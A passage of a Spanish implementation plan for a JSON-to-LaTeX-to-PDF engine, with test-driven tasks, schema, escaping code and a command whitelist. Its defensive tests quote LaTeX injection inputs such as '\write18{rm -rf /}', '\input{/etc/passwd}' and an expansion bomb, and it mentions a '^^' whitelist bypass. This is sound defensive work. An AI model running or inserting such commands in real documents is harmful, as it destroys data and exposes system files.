# Caminata esquelética — Plan de implementación

> ## EJECUTADO el 2026-07-25. Las 10 tareas están hechas.
>
> **Resultado:** 89 pruebas pasando. `ctex tests/datos/hoja_ejemplo.json`
> produce un PDF con el título, la ecuación numerada y la gráfica dibujada por
> pgfplots. El corpus de ataques queda bloqueado.
>
> **Lo que el plan no anticipó:** la lista blanca de comandos era evadible con la
> notación `^^` de TeX. Se comprobó compilando —`\^^73ection{X}` produjo una
> sección real— y se cerró en la misma sesión. Ver **D32** en el registro de
> decisiones. Las casillas de abajo quedan sin marcar a propósito: el documento
> se conserva como se escribió, y lo que pasó al ejecutarlo está en el registro.

> **Para trabajadores agénticos:** SUB-SKILL REQUERIDA: usa
> superpowers:subagent-driven-development (recomendado) o
> superpowers:executing-plans para implementar este plan tarea por tarea. Los
> pasos usan casillas (`- [ ]`) para el seguimiento.

**Objetivo:** que un JSON del contrato escrito a mano produzca un PDF compilado
de verdad, atravesando las etapas 4 a 7 del motor sin tocar una sola imagen.

**Arquitectura:** tres módulos con frontera limpia. `contrato` define y valida el
esquema JSON de la Sección 5. `composicion` traduce ese documento a LaTeX usando
plantillas propias, escapando todo texto y filtrando comandos por lista blanca.
`compilacion` invoca Tectonic en modo no confiable y devuelve el PDF. Un comando
de línea las une.

**Pila:** Python 3.11+, pytest, jsonschema, pgfplots, Tectonic.

## Restricciones globales

Aplican a **todas** las tareas. Los valores están copiados de la especificación.

- **El contrato es la frontera de seguridad.** La composición nunca copia texto
  del contrato al `.tex` sin escaparlo o sin validarlo contra lista blanca.
- **Versión del contrato:** `"1.0"`. Un documento con otra versión se rechaza.
- **La confianza siempre se propaga.** Ningún bloque existe sin `confianza`.
- **Los consumidores ignoran lo que no conocen.** Un bloque de tipo desconocido
  se salta con advertencia, nunca revienta.
- **shell-escape desactivado, sin excepción.** Tectonic corre con `--untrusted`.
- **Límites por compilación:** 60 s y 1 GB, proceso muerto al excederse.
- **El motor siempre entrega un PDF.** Lo que no compila se degrada a texto
  literal marcado visiblemente.
- **Una sola plantilla en la v1:** artículo limpio.
- **La salida es el PDF y el `.tex`.** El `.tex` es del usuario.
- **matplotlib no aparece en ninguna parte de la ruta de salida** (D10).
- **En Python nunca se recorre píxel por píxel** (D11). No aplica en este plan
  —no hay imágenes— pero se anota porque aplica a partir de la fase 1.

---

## Estructura de archivos

```
pyproject.toml
src/ctex/
  __init__.py
  contrato/
    __init__.py
    esquema.json          # el esquema JSON del contrato v1.0
    validador.py          # valida un documento contra el esquema
  composicion/
    __init__.py
    escapado.py           # escapar texto y filtrar comandos por lista blanca
    plantilla.py          # preámbulo y esqueleto del documento
    bloques.py            # un compositor por tipo de bloque
    compositor.py         # documento completo, salta tipos desconocidos
  compilacion/
    __init__.py
    tectonic.py           # invocar Tectonic con confinamiento
  cli.py                  # el comando `ctex`
tests/
  contrato/test_validador.py
  composicion/test_escapado.py
  composicion/test_bloques.py
  composicion/test_compositor.py
  compilacion/test_tectonic.py
  test_seguridad.py
  test_extremo_a_extremo.py
  datos/hoja_ejemplo.json # el JSON de la Sección 5, literal
```

**Por qué así:** `escapado.py` separado de `bloques.py` porque es la pieza de
seguridad y se prueba sola. `bloques.py` separado de `compositor.py` porque cada
tipo de bloque se verifica aislado y el compositor solo ordena y salta lo
desconocido. `esquema.json` es un archivo y no código porque es el artefacto que
la API pública va a publicar más adelante.

**Fuera de alcance de este plan, con motivo:**

| Fuera | Por qué |
|---|---|
| Ciclo de reparación y reintento (D17) | Es una mejora sobre un camino que primero tiene que existir. Plan siguiente |
| Etapas 1, 2 y 3 (imagen → contrato) | Es la fase 1. Depende de R4 y de lo que se aprenda aquí |
| Compuerta de dudas (etapa 5) | No hay dudas que separar hasta que haya un extractor |

---

## Tarea 1: Andamiaje del repositorio

**Archivos:**
- Crear: `pyproject.toml`
- Crear: `src/ctex/__init__.py`
- Crear: `tests/test_andamiaje.py`
- Crear: `.gitignore`

**Interfaces:**
- Consume: nada.
- Produce: el paquete importable `ctex` y un `pytest` que corre.

- [ ] **Paso 1: Escribir la prueba que falla**

`tests/test_andamiaje.py`:

```python
def test_el_paquete_se_importa():
    import ctex

    assert ctex.__version__ == "0.1.0"
```

- [ ] **Paso 2: Correr la prueba y verificar que falla**

```
python -m pytest tests/test_andamiaje.py -v
```

Esperado: FALLA con `ModuleNotFoundError: No module named 'ctex'`.

- [ ] **Paso 3: Crear el `pyproject.toml`**

```toml
[project]
name = "ctex"
version = "0.1.0"
description = "Motor de conversion de documentos capturados a PDF via LaTeX"
requires-python = ">=3.11"
dependencies = [
    "jsonschema>=4.20",
]

[project.optional-dependencies]
dev = ["pytest>=8.0"]

[project.scripts]
ctex = "ctex.cli:main"

[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[tool.setuptools.packages.find]
where = ["src"]

[tool.setuptools.package-data]
ctex = ["contrato/*.json"]

[tool.pytest.ini_options]
testpaths = ["tests"]
```

- [ ] **Paso 4: Crear el paquete**

`src/ctex/__init__.py`:

```python
__version__ = "0.1.0"
```

- [ ] **Paso 5: Crear el `.gitignore`**

```
__pycache__/
*.pyc
.venv/
.pytest_cache/
*.egg-info/
salida/
```

- [ ] **Paso 6: Crear el entorno e instalar**

En Windows con PowerShell:

```
python -m venv .venv
.venv\Scripts\Activate.ps1
pip install -e ".[dev]"
```

En Git Bash:

```
python -m venv .venv
source .venv/Scripts/activate
pip install -e ".[dev]"
```

Esperado: `Successfully installed ctex-0.1.0`.

- [ ] **Paso 7: Correr la prueba y verificar que pasa**

```
python -m pytest tests/test_andamiaje.py -v
```

Esperado: `1 passed`.

- [ ] **Paso 8: Commit**

```bash
git add pyproject.toml .gitignore src/ tests/
git commit -m "Andamiaje: paquete ctex, pytest y entorno de desarrollo"
```

---

## Tarea 2: El esquema del contrato y su validador

**Archivos:**
- Crear: `src/ctex/contrato/__init__.py`
- Crear: `src/ctex/contrato/esquema.json`
- Crear: `src/ctex/contrato/validador.py`
- Crear: `tests/datos/hoja_ejemplo.json`
- Crear: `tests/contrato/test_validador.py`

**Interfaces:**
- Consume: nada.
- Produce:
  - `ctex.contrato.validador.validar(documento: dict) -> None` — lanza
    `ErrorDeContrato` si el documento no cumple el esquema.
  - `ctex.contrato.validador.ErrorDeContrato(Exception)`.
  - `ctex.contrato.validador.VERSION_SOPORTADA: str` — `"1.0"`.

- [ ] **Paso 1: Crear el documento de ejemplo**

`tests/datos/hoja_ejemplo.json` — copia literal del ejemplo de la Sección 5 de la
especificación:

```json
{
  "version_contrato": "1.0",
  "origen": { "archivo": "hoja_03.jpg", "pagina": 1 },
  "bloques": [
    {
      "id": "b1",
      "tipo": "titulo",
      "region": { "x": 120, "y": 80, "ancho": 900, "alto": 60 },
      "confianza": 0.98,
      "contenido": { "nivel": 1, "texto": "Series de Fourier" }
    },
    {
      "id": "b2",
      "tipo": "ecuacion",
      "region": { "x": 200, "y": 340, "ancho": 700, "alto": 120 },
      "confianza": 0.71,
      "contenido": {
        "latex": "f(x)=\\sum_{n=1}^{6} a_n \\cos(nx)",
        "numerada": true
      }
    },
    {
      "id": "b3",
      "tipo": "grafica",
      "region": { "x": 150, "y": 600, "ancho": 800, "alto": 640 },
      "confianza": 0.84,
      "contenido": {
        "tipo_grafica": "lineas",
        "titulo": "Convergencia",
        "ejes": {
          "x": { "min": 0, "max": 10, "etiqueta": "n", "escala": "lineal" },
          "y": { "min": -1, "max": 1, "etiqueta": "error", "escala": "lineal" }
        },
        "series": [
          { "etiqueta": "parcial",
            "puntos": [[0,0.9],[2,0.42],[4,0.21],[6,0.1]] }
        ]
      }
    }
  ],
  "dudas": []
}
```

- [ ] **Paso 2: Escribir las pruebas que fallan**

`tests/contrato/test_validador.py`:

```python
import copy
import json
from pathlib import Path

import pytest

from ctex.contrato.validador import ErrorDeContrato, validar

DATOS = Path(__file__).parent.parent / "datos"


def cargar_ejemplo() -> dict:
    with open(DATOS / "hoja_ejemplo.json", encoding="utf-8") as f:
        return json.load(f)


def test_el_ejemplo_de_la_especificacion_es_valido():
    validar(cargar_ejemplo())


def test_una_version_distinta_se_rechaza():
    doc = cargar_ejemplo()
    doc["version_contrato"] = "2.0"
    with pytest.raises(ErrorDeContrato):
        validar(doc)


def test_un_bloque_sin_confianza_se_rechaza():
    # Regla 2 del contrato: la confianza siempre se propaga.
    doc = cargar_ejemplo()
    del doc["bloques"][0]["confianza"]
    with pytest.raises(ErrorDeContrato):
        validar(doc)


def test_una_confianza_fuera_de_rango_se_rechaza():
    doc = cargar_ejemplo()
    doc["bloques"][0]["confianza"] = 1.5
    with pytest.raises(ErrorDeContrato):
        validar(doc)


def test_un_bloque_de_tipo_desconocido_es_valido():
    # Regla 1: el esquema admite tipos nuevos. Quien decide saltarlos es la
    # composicion, no el validador.
    doc = cargar_ejemplo()
    doc["bloques"].append({
        "id": "b9",
        "tipo": "inventado",
        "region": {"x": 0, "y": 0, "ancho": 10, "alto": 10},
        "confianza": 0.5,
        "contenido": {"lo_que_sea": True},
    })
    validar(doc)


def test_una_duda_apunta_a_un_bloque_y_lleva_alternativas():
    doc = cargar_ejemplo()
    doc["dudas"].append({
        "id": "d1",
        "bloque_id": "b2",
        "tipo": "simbolo_ambiguo",
        "region": {"x": 512, "y": 350, "ancho": 40, "alto": 44},
        "descripcion": "El limite superior de la suma",
        "alternativas": [
            {"valor": "6", "probabilidad": 0.55},
            {"valor": "b", "probabilidad": 0.41},
        ],
    })
    validar(doc)


def test_el_documento_no_se_modifica_al_validarlo():
    doc = cargar_ejemplo()
    antes = copy.deepcopy(doc)
    validar(doc)
    assert doc == antes
```

- [ ] **Paso 3: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/contrato/ -v
```

Esperado: FALLA con `ModuleNotFoundError: No module named 'ctex.contrato'`.

- [ ] **Paso 4: Escribir el esquema**

`src/ctex/contrato/esquema.json`:

```json
{
  "$schema": "https://json-schema.org/draft/2020-12/schema",
  "title": "Contrato del motor C-tex, version 1.0",
  "type": "object",
  "required": ["version_contrato", "origen", "bloques", "dudas"],
  "properties": {
    "version_contrato": { "const": "1.0" },
    "origen": {
      "type": "object",
      "required": ["archivo", "pagina"],
      "properties": {
        "archivo": { "type": "string" },
        "pagina": { "type": "integer", "minimum": 1 }
      }
    },
    "bloques": { "type": "array", "items": { "$ref": "#/$defs/bloque" } },
    "dudas": { "type": "array", "items": { "$ref": "#/$defs/duda" } }
  },
  "$defs": {
    "region": {
      "type": "object",
      "required": ["x", "y", "ancho", "alto"],
      "properties": {
        "x": { "type": "number" },
        "y": { "type": "number" },
        "ancho": { "type": "number", "exclusiveMinimum": 0 },
        "alto": { "type": "number", "exclusiveMinimum": 0 }
      }
    },
    "bloque": {
      "type": "object",
      "required": ["id", "tipo", "region", "confianza", "contenido"],
      "properties": {
        "id": { "type": "string", "minLength": 1 },
        "tipo": { "type": "string", "minLength": 1 },
        "region": { "$ref": "#/$defs/region" },
        "confianza": { "type": "number", "minimum": 0, "maximum": 1 },
        "contenido": { "type": "object" }
      }
    },
    "duda": {
      "type": "object",
      "required": ["id", "bloque_id", "tipo", "region", "descripcion"],
      "properties": {
        "id": { "type": "string", "minLength": 1 },
        "bloque_id": { "type": "string", "minLength": 1 },
        "tipo": {
          "enum": [
            "simbolo_ambiguo", "punto_incierto", "escala_incierta",
            "texto_ilegible", "region_dudosa"
          ]
        },
        "region": { "$ref": "#/$defs/region" },
        "descripcion": { "type": "string" },
        "alternativas": {
          "type": "array",
          "items": {
            "type": "object",
            "required": ["valor", "probabilidad"],
            "properties": {
              "valor": { "type": "string" },
              "probabilidad": { "type": "number", "minimum": 0, "maximum": 1 }
            }
          }
        }
      }
    }
  }
}
```

> **Nota de diseño:** `tipo` del bloque es `string` libre y no un `enum`. Es
> deliberado: la regla 1 del contrato dice que los tipos nuevos no deben romper a
> los consumidores existentes. Si el esquema los rechazara, agregar `tabla` en la
> v2 obligaría a subir la versión del contrato.

- [ ] **Paso 5: Escribir el validador**

`src/ctex/contrato/__init__.py`:

```python
from ctex.contrato.validador import ErrorDeContrato, VERSION_SOPORTADA, validar

__all__ = ["ErrorDeContrato", "VERSION_SOPORTADA", "validar"]
```

`src/ctex/contrato/validador.py`:

```python
"""Validacion de documentos contra el esquema del contrato."""

import json
from functools import lru_cache
from pathlib import Path

import jsonschema

VERSION_SOPORTADA = "1.0"

_RUTA_ESQUEMA = Path(__file__).parent / "esquema.json"


class ErrorDeContrato(Exception):
    """El documento no cumple el esquema del contrato."""


@lru_cache(maxsize=1)
def _esquema() -> dict:
    with open(_RUTA_ESQUEMA, encoding="utf-8") as f:
        return json.load(f)


def validar(documento: dict) -> None:
    """Valida un documento. Lanza ErrorDeContrato si no cumple.

    No modifica el documento y no devuelve nada: o pasa, o levanta.
    """
    try:
        jsonschema.validate(instance=documento, schema=_esquema())
    except jsonschema.ValidationError as error:
        ruta = "/".join(str(parte) for parte in error.absolute_path)
        ubicacion = f" en '{ruta}'" if ruta else ""
        raise ErrorDeContrato(f"Documento invalido{ubicacion}: {error.message}") from error
```

- [ ] **Paso 6: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/contrato/ -v
```

Esperado: `7 passed`.

- [ ] **Paso 7: Commit**

```bash
git add src/ctex/contrato/ tests/contrato/ tests/datos/
git commit -m "Contrato: esquema v1.0 y validador, con las tres reglas cubiertas"
```

---

## Tarea 3: Escapado de texto y lista blanca de comandos

Esta es **la pieza de seguridad** de la Sección 9. Se prueba sola y antes que
nada la use.

**Archivos:**
- Crear: `src/ctex/composicion/__init__.py`
- Crear: `src/ctex/composicion/escapado.py`
- Crear: `tests/composicion/test_escapado.py`

**Interfaces:**
- Consume: nada.
- Produce:
  - `ctex.composicion.escapado.escapar(texto: str) -> str`
  - `ctex.composicion.escapado.comandos_no_permitidos(latex: str) -> set[str]`
  - `ctex.composicion.escapado.COMANDOS_PERMITIDOS: frozenset[str]`

> **Hallazgo de planeación, para anotar en el registro de decisiones.** La
> especificación dice que *"el contrato no tiene ningún campo donde quepa un
> comando"*, pero el bloque `ecuacion` sí lleva un campo `latex` con `\sum` y
> `\cos` dentro. La afirmación es demasiado fuerte tal como está escrita. La
> defensa real es la que la tabla de la Sección 9 ya nombra: **lista blanca de
> comandos permitidos**. Esta tarea la implementa.

- [ ] **Paso 1: Escribir las pruebas que fallan**

`tests/composicion/test_escapado.py`:

```python
from ctex.composicion.escapado import comandos_no_permitidos, escapar


def test_escapa_los_caracteres_especiales_de_latex():
    assert escapar("100% & 50$") == r"100\% \& 50\$"
    assert escapar("a_b^c") == r"a\_b\textasciicircum{}c"
    assert escapar("#1 {x}") == r"\#1 \{x\}"


def test_la_barra_invertida_no_cascadea():
    # \textbackslash{} introduce llaves. Si el escapado hiciera varias pasadas,
    # esas llaves se volverian a escapar y el resultado seria basura.
    assert escapar("\\") == r"\textbackslash{}"


def test_un_intento_de_inyeccion_queda_inerte():
    peligro = r"\write18{rm -rf /}"
    resultado = escapar(peligro)
    assert r"\write18" not in resultado
    assert resultado.startswith(r"\textbackslash{}write18")


def test_el_texto_sin_caracteres_especiales_no_cambia():
    assert escapar("Series de Fourier") == "Series de Fourier"


def test_una_ecuacion_normal_no_tiene_comandos_prohibidos():
    assert comandos_no_permitidos(r"f(x)=\sum_{n=1}^{6} a_n \cos(nx)") == set()


def test_write18_es_un_comando_prohibido():
    assert comandos_no_permitidos(r"\write18{ls}") == {"write"}


def test_input_es_un_comando_prohibido():
    assert comandos_no_permitidos(r"\input{/etc/passwd}") == {"input"}


def test_def_es_un_comando_prohibido():
    # Bomba de expansion: \def\x{\x\x}\x
    assert "def" in comandos_no_permitidos(r"\def\x{\x\x}\x")


def test_devuelve_todos_los_prohibidos_no_solo_el_primero():
    assert comandos_no_permitidos(r"\input{a} \write18{b}") == {"input", "write"}
```

- [ ] **Paso 2: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/composicion/test_escapado.py -v
```

Esperado: FALLA con `ModuleNotFoundError: No module named 'ctex.composicion'`.

- [ ] **Paso 3: Escribir el escapado**

`src/ctex/composicion/__init__.py`:

```python
```

(archivo vacío, solo marca el paquete)

`src/ctex/composicion/escapado.py`:

```python
"""Escapado de texto y filtrado de comandos.

Esta es la frontera de seguridad de la composicion. Todo texto que venga del
contrato pasa por `escapar` antes de llegar al .tex, y todo campo `latex` pasa
por `comandos_no_permitidos` antes de insertarse tal cual.
"""

import re

# str.translate hace UNA sola pasada sobre la cadena, asi que las llaves que
# introduce \textbackslash{} no se vuelven a escapar. Un bucle de .replace()
# encadenados si tendria ese error.
_TABLA = str.maketrans({
    "\\": r"\textbackslash{}",
    "&": r"\&",
    "%": r"\%",
    "$": r"\$",
    "#": r"\#",
    "_": r"\_",
    "{": r"\{",
    "}": r"\}",
    "~": r"\textasciitilde{}",
    "^": r"\textasciicircum{}",
})

COMANDOS_PERMITIDOS = frozenset({
    # estructura matematica
    "frac", "sqrt", "sum", "prod", "int", "lim", "infty", "partial",
    "left", "right", "cdot", "times", "div", "pm", "mp",
    "leq", "geq", "neq", "approx", "equiv", "propto",
    "quad", "qquad",
    # funciones
    "sin", "cos", "tan", "cot", "sec", "csc",
    "arcsin", "arccos", "arctan", "log", "ln", "exp", "max", "min",
    # letras griegas
    "alpha", "beta", "gamma", "delta", "epsilon", "varepsilon", "zeta",
    "eta", "theta", "vartheta", "iota", "kappa", "lambda", "mu", "nu",
    "xi", "pi", "rho", "sigma", "tau", "upsilon", "phi", "varphi",
    "chi", "psi", "omega",
    "Gamma", "Delta", "Theta", "Lambda", "Xi", "Pi", "Sigma",
    "Upsilon", "Phi", "Psi", "Omega",
    # conjuntos y logica
    "in", "notin", "subset", "subseteq", "cup", "cap", "emptyset",
    "forall", "exists", "to", "rightarrow", "leftarrow", "Rightarrow",
    # tipografia matematica
    "mathbb", "mathcal", "mathrm", "mathbf", "text",
})

_PATRON_COMANDO = re.compile(r"\\([a-zA-Z]+)")


def escapar(texto: str) -> str:
    """Convierte texto plano en texto seguro para insertar en un .tex."""
    return texto.translate(_TABLA)


def comandos_no_permitidos(latex: str) -> set[str]:
    """Devuelve los comandos del fragmento que no estan en la lista blanca.

    Un conjunto vacio significa que el fragmento se puede insertar tal cual.
    """
    encontrados = set(_PATRON_COMANDO.findall(latex))
    return encontrados - COMANDOS_PERMITIDOS
```

- [ ] **Paso 4: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/composicion/test_escapado.py -v
```

Esperado: `9 passed`.

- [ ] **Paso 5: Commit**

```bash
git add src/ctex/composicion/ tests/composicion/
git commit -m "Composicion: escapado de texto y lista blanca de comandos"
```

---

## Tarea 4: La plantilla y los bloques de texto

**Archivos:**
- Crear: `src/ctex/composicion/plantilla.py`
- Crear: `src/ctex/composicion/bloques.py`
- Crear: `tests/composicion/test_bloques.py`

**Interfaces:**
- Consume: `escapar` de la tarea 3.
- Produce:
  - `ctex.composicion.plantilla.PREAMBULO: str`
  - `ctex.composicion.plantilla.envolver(cuerpo: str) -> str`
  - `ctex.composicion.bloques.componer_titulo(contenido: dict) -> str`
  - `ctex.composicion.bloques.componer_parrafo(contenido: dict) -> str`

- [ ] **Paso 1: Escribir las pruebas que fallan**

`tests/composicion/test_bloques.py`:

```python
from ctex.composicion.bloques import componer_parrafo, componer_titulo
from ctex.composicion.plantilla import envolver


def test_un_titulo_de_nivel_1_es_una_section():
    salida = componer_titulo({"nivel": 1, "texto": "Series de Fourier"})
    assert salida == r"\section{Series de Fourier}"


def test_un_titulo_de_nivel_2_es_una_subsection():
    salida = componer_titulo({"nivel": 2, "texto": "Convergencia"})
    assert salida == r"\subsection{Convergencia}"


def test_un_titulo_de_nivel_absurdo_cae_en_el_mas_profundo():
    salida = componer_titulo({"nivel": 99, "texto": "Hondo"})
    assert salida == r"\subsubsection{Hondo}"


def test_el_texto_del_titulo_va_escapado():
    salida = componer_titulo({"nivel": 1, "texto": "Costos & margenes 100%"})
    assert salida == r"\section{Costos \& margenes 100\%}"


def test_un_parrafo_es_texto_escapado():
    salida = componer_parrafo({"texto": "La suma converge."})
    assert salida == "La suma converge."


def test_el_texto_del_parrafo_va_escapado():
    salida = componer_parrafo({"texto": r"Ejecuta \write18{ls} ahora"})
    assert r"\write18" not in salida


def test_envolver_produce_un_documento_completo():
    salida = envolver(r"\section{Hola}")
    assert salida.startswith(r"\documentclass")
    assert r"\begin{document}" in salida
    assert r"\section{Hola}" in salida
    assert salida.rstrip().endswith(r"\end{document}")


def test_el_preambulo_carga_pgfplots():
    salida = envolver("")
    assert r"\usepackage{pgfplots}" in salida
```

- [ ] **Paso 2: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/composicion/test_bloques.py -v
```

Esperado: FALLA con `ModuleNotFoundError: No module named 'ctex.composicion.bloques'`.

- [ ] **Paso 3: Escribir la plantilla**

`src/ctex/composicion/plantilla.py`:

```python
"""La unica plantilla de la v1: un articulo limpio (D16)."""

PREAMBULO = r"""\documentclass[11pt]{article}
\usepackage[T1]{fontenc}
\usepackage[utf8]{inputenc}
\usepackage[spanish]{babel}
\usepackage[margin=2.5cm]{geometry}
\usepackage{amsmath}
\usepackage{amssymb}
\usepackage{pgfplots}
\pgfplotsset{compat=1.18}
\usepackage{xcolor}

% Marca visible para los bloques degradados (D18).
\newcommand{\ctexdegradado}[1]{%
  \par\noindent\fcolorbox{red}{red!5}{%
    \parbox{\dimexpr\linewidth-2\fboxsep-2\fboxrule}{%
      \textcolor{red}{\textbf{[no se pudo componer]}}\\ \texttt{#1}%
    }%
  }\par
}
"""


def envolver(cuerpo: str) -> str:
    """Mete el cuerpo compuesto dentro del documento completo."""
    return f"{PREAMBULO}\n\\begin{{document}}\n\n{cuerpo}\n\n\\end{{document}}\n"
```

- [ ] **Paso 4: Escribir los compositores de texto**

`src/ctex/composicion/bloques.py`:

```python
"""Un compositor por tipo de bloque del contrato.

Cada funcion recibe el `contenido` del bloque y devuelve un fragmento de LaTeX.
Ninguna copia texto del contrato sin pasarlo por `escapar`.
"""

from ctex.composicion.escapado import escapar

_NIVELES = ["section", "subsection", "subsubsection"]


def componer_titulo(contenido: dict) -> str:
    nivel = int(contenido.get("nivel", 1))
    indice = min(max(nivel, 1), len(_NIVELES)) - 1
    return f"\\{_NIVELES[indice]}{{{escapar(contenido['texto'])}}}"


def componer_parrafo(contenido: dict) -> str:
    return escapar(contenido["texto"])
```

- [ ] **Paso 5: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/composicion/test_bloques.py -v
```

Esperado: `8 passed`.

- [ ] **Paso 6: Commit**

```bash
git add src/ctex/composicion/plantilla.py src/ctex/composicion/bloques.py tests/composicion/test_bloques.py
git commit -m "Composicion: plantilla de articulo y bloques de titulo y parrafo"
```

---

## Tarea 5: El bloque de ecuación, con degradación

**Archivos:**
- Modificar: `src/ctex/composicion/bloques.py` (agregar `componer_ecuacion`)
- Modificar: `tests/composicion/test_bloques.py` (agregar pruebas)

**Interfaces:**
- Consume: `escapar`, `comandos_no_permitidos` de la tarea 3.
- Produce: `ctex.composicion.bloques.componer_ecuacion(contenido: dict) -> str`

- [ ] **Paso 1: Escribir las pruebas que fallan**

Agregar al final de `tests/composicion/test_bloques.py`:

```python
from ctex.composicion.bloques import componer_ecuacion


def test_una_ecuacion_numerada_usa_el_entorno_equation():
    salida = componer_ecuacion({
        "latex": r"f(x)=\sum_{n=1}^{6} a_n \cos(nx)",
        "numerada": True,
    })
    assert salida == (
        "\\begin{equation}\n"
        r"f(x)=\sum_{n=1}^{6} a_n \cos(nx)"
        "\n\\end{equation}"
    )


def test_una_ecuacion_no_numerada_usa_equation_estrella():
    salida = componer_ecuacion({"latex": "a+b=c", "numerada": False})
    assert salida.startswith(r"\begin{equation*}")
    assert salida.endswith(r"\end{equation*}")


def test_una_ecuacion_sin_el_campo_numerada_se_numera():
    salida = componer_ecuacion({"latex": "a+b=c"})
    assert r"\begin{equation}" in salida


def test_una_ecuacion_con_comando_prohibido_se_degrada():
    # D18: el motor siempre entrega un PDF. Un bloque que no se puede componer
    # se inserta como texto literal, marcado visiblemente.
    salida = componer_ecuacion({"latex": r"\write18{rm -rf /}", "numerada": True})
    assert r"\ctexdegradado" in salida
    assert r"\begin{equation}" not in salida


def test_una_ecuacion_degradada_no_deja_pasar_el_comando():
    salida = componer_ecuacion({"latex": r"\write18{ls}", "numerada": True})
    assert r"\write18" not in salida


def test_una_ecuacion_con_input_se_degrada():
    salida = componer_ecuacion({"latex": r"\input{/etc/passwd}"})
    assert r"\ctexdegradado" in salida
```

- [ ] **Paso 2: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/composicion/test_bloques.py -v
```

Esperado: FALLA con `ImportError: cannot import name 'componer_ecuacion'`.

- [ ] **Paso 3: Escribir el compositor de ecuaciones**

Agregar a `src/ctex/composicion/bloques.py`. Cambiar la línea de importación:

```python
from ctex.composicion.escapado import comandos_no_permitidos, escapar
```

Y agregar la función:

```python
def degradar(texto_original: str) -> str:
    """Inserta un fragmento como texto literal, marcado visiblemente (D18)."""
    return f"\\ctexdegradado{{{escapar(texto_original)}}}"


def componer_ecuacion(contenido: dict) -> str:
    latex = contenido["latex"]

    prohibidos = comandos_no_permitidos(latex)
    if prohibidos:
        # No se compone lo que no se entiende. El bloque se degrada y el resto
        # del documento sale bien.
        return degradar(latex)

    entorno = "equation" if contenido.get("numerada", True) else "equation*"
    return f"\\begin{{{entorno}}}\n{latex}\n\\end{{{entorno}}}"
```

- [ ] **Paso 4: Correr las pruebas y verificar que pasan**

```
python -m pytest tests/composicion/test_bloques.py -v
```

Esperado: `14 passed`.

- [ ] **Paso 5: Commit**

```bash
git add src/ctex/composicion/bloques.py tests/composicion/test_bloques.py
git commit -m "Composicion: bloque de ecuacion con lista blanca y degradacion"
```

---

## Tarea 6: El bloque de gráfica, con pgfplots

Aquí es donde D3 y D10 se vuelven código: **la gráfica se dibuja con pgfplots a
partir de números, y matplotlib no aparece por ningún lado.**

**Archivos:**
- Modificar: `src/ctex/composicion/bloques.py` (agregar `componer_grafica`)
- Modificar: `tests/composicion/test_bloques.py` (agregar pruebas)

**Interfaces:**
- Consume: `escapar` de la tarea 3.
- Produce: `ctex.composicion.bloques.componer_grafica(contenido: dict) -> str`

- [ ] **Paso 1: Escribir las pruebas que fallan**

Agregar a `tests/composicion/test_bloques.py`:

```python
from ctex.composicion.bloques import componer_grafica

GRAFICA_EJEMPLO = {
    "tipo_grafica": "lineas",
    "titulo": "Convergencia",
    "ejes": {
        "x": {"min": 0, "max": 10, "etiqueta": "n", "escala": "lineal"},
        "y": {"min": -1, "max": 1, "etiqueta": "error", "escala": "lineal"},
    },
    "series": [
        {"etiqueta": "parcial", "puntos": [[0, 0.9], [2, 0.42], [4, 0.21], [6, 0.1]]}
    ],
}


def test_una_grafica_produce_un_entorno_axis():
    salida = componer_grafica(GRAFICA_EJEMPLO)
    assert r"\begin{tikzpicture}" in salida
    assert r"\begin{axis}" in salida
    assert r"\end{tikzpicture}" in salida


def test_los_limites_de_los_ejes_salen_del_contrato():
    salida = componer_grafica(GRAFICA_EJEMPLO)
    assert "xmin=0" in salida
    assert "xmax=10" in salida
    assert "ymin=-1" in salida
    assert "ymax=1" in salida


def test_los_puntos_salen_como_coordenadas():
    salida = componer_grafica(GRAFICA_EJEMPLO)
    assert "(0,0.9)" in salida
    assert "(6,0.1)" in salida


def test_la_grafica_no_contiene_ninguna_imagen_incrustada():
    # D10: matplotlib no aparece en la ruta de salida. Lo que sale son numeros.
    salida = componer_grafica(GRAFICA_EJEMPLO)
    assert r"\includegraphics" not in salida


def test_una_escala_logaritmica_se_traduce():
    contenido = {
        **GRAFICA_EJEMPLO,
        "ejes": {
            "x": {"min": 1, "max": 100, "etiqueta": "n", "escala": "log"},
            "y": {"min": -1, "max": 1, "etiqueta": "error", "escala": "lineal"},
        },
    }
    salida = componer_grafica(contenido)
    assert "xmode=log" in salida


def test_las_etiquetas_van_escapadas():
    contenido = {
        **GRAFICA_EJEMPLO,
        "titulo": "Costos & margenes",
        "ejes": {
            "x": {"min": 0, "max": 10, "etiqueta": "100%", "escala": "lineal"},
            "y": {"min": -1, "max": 1, "etiqueta": "error", "escala": "lineal"},
        },
    }
    salida = componer_grafica(contenido)
    assert r"Costos \& margenes" in salida
    assert r"100\%" in salida


def test_varias_series_producen_varios_addplot():
    contenido = {
        **GRAFICA_EJEMPLO,
        "series": [
            {"etiqueta": "a", "puntos": [[0, 1], [1, 2]]},
            {"etiqueta": "b", "puntos": [[0, 3], [1, 4]]},
        ],
    }
    salida = componer_grafica(contenido)
    assert salida.count(r"\addplot") == 2
```

- [ ] **Paso 2: Correr las pruebas y verificar que fallan**

```
python -m pytest tests/composicion/test_bloques.py -v
```

Esperado: FALLA con `ImportError: cannot import name 'componer_grafica'`.

- [ ] **Paso 3: Escribir el compositor de gráficas**

Agregar a `src/ctex/composicion/bloques.py`:

```python
def _formatear(valor: float) -> str:
    """Numero sin ceros de relleno: 0.9 y no 0.900000."""
    if isinstance(valor, int) or float(valor).is_integer():
        return str(int(valor))
    return f"{valor:g}"


def _opciones_de_eje(eje: dict, nombre: str) -> list[str]:
    opciones = [
        f"{nombre}min={_formatear(eje['min'])}",
        f"{nombre}max={_formatear(eje['max'])}",
        f"{nombre}label={{{escapar(eje.get('etiqueta', ''))}}}",
    ]
    if eje.get("escala") == "log":
        opciones.append(f"{nombre}mode=log")
    return opciones


def componer_grafica(contenido: dict) -> str:
    ejes = contenido["ejes"]
    opciones = _opciones_de_eje(ejes["x"], "x") + _opciones_de_eje(ejes["y"], "y")
    opciones.append("grid=both")
    opciones.append("legend pos=north east")

    trazos = []
    for serie in contenido["series"]:
        puntos = " ".join(
            f"({_formatear(x)},{_formatear(y)})" for x, y in serie["puntos"]
        )
